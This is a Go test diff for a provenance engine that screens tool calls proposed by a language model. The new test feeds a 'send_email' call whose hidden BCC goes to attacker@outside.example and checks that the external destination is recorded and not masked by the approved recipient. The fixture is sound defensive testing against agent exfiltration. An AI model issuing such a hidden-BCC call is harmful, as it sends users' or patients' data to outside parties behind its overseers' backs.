@@ -384,3 +384,35 @@ func TestProvenanceQuarantine(t *testing.T) {
 		}
 	}
 }
+
+func TestProposedEmailCannotHideExternalBCCBehindApprovedRecipient(t *testing.T) {
+	engine := newProvenanceEngine(t)
+	settings := engine.Settings(t.Context())
+	settings.ApprovedDestinations = []string{"care.internal.example"}
+	if err := engine.Store().PutSettings(t.Context(), settings); err != nil {
+		t.Fatal(err)
+	}
+	engine.Invalidate()
+	pc := &ProvenanceContext{Engine: engine, Subject: provSubject, Session: provKey}
+	calls := []llm.ProposedCall{{Name: "send_email", ArgumentsJSON: `{"to":"team@care.internal.example","bcc":"attacker@outside.example","body":"patient@customer.example"}`}}
+	if err := pc.decide(t.Context(), calls); err != nil {
+		t.Fatal(err)
+	}
+	session, err := engine.Resolve(t.Context(), provSubject, provKey, provenance.SurfaceLLM)
+	if err != nil {
+		t.Fatal(err)
+	}
+	events, _, err := engine.Store().ListEvents(t.Context(), provenance.EventQuery{SessionID: session.ID})
+	if err != nil {
+		t.Fatal(err)
+	}
+	for _, event := range events {
+		if event.Action != nil && event.Action.Tool == "send_email" {
+			if !event.Action.Sink.External || event.Action.Sink.Destination != "outside.example" {
+				t.Fatalf("external BCC was hidden: %+v", event.Action.Sink)
+			}
+			return
+		}
+	}
+	t.Fatal("missing tool call event")
+}
